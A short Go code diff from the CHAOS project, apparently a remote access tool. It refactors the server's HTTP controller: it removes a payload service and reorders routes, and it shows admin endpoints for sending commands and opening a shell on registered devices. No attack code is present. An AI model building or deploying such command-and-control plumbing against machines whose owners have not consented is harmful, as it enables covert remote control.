@@ -8,7 +8,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/services/auth"
 	"github.com/tiagorlampert/CHAOS/services/client"
 	"github.com/tiagorlampert/CHAOS/services/device"
-	"github.com/tiagorlampert/CHAOS/services/payload"
 	"github.com/tiagorlampert/CHAOS/services/url"
 	"github.com/tiagorlampert/CHAOS/services/user"
 )
@@ -21,7 +20,6 @@ type httpController struct {
 	AuthService    auth.Service
 	UserService    user.Service
 	DeviceService  device.Service
-	PayloadService payload.Service
 	UrlService     url.Service
 }
 
@@ -32,7 +30,6 @@ func NewController(
 	authMiddleware *middleware.JWT,
 	clientService client.Service,
 	systemService auth.Service,
-	payloadService payload.Service,
 	userService user.Service,
 	deviceService device.Service,
 	urlService url.Service,
@@ -42,7 +39,6 @@ func NewController(
 		AuthMiddleware: authMiddleware,
 		Logger:         log,
 		ClientService:  clientService,
-		PayloadService: payloadService,
 		AuthService:    systemService,
 		UserService:    userService,
 		DeviceService:  deviceService,
@@ -75,8 +71,8 @@ func NewController(
 		authGroup.POST("/device", handler.setDeviceHandler)
 		adminGroup.GET("/devices", handler.getDevicesHandler)
 
-		adminGroup.POST("/command", handler.sendCommandHandler)
 		authGroup.GET("/client", handler.clientHandler)
+		adminGroup.POST("/command", handler.sendCommandHandler)
 
 		adminGroup.GET("/shell", handler.shellHandler)
 
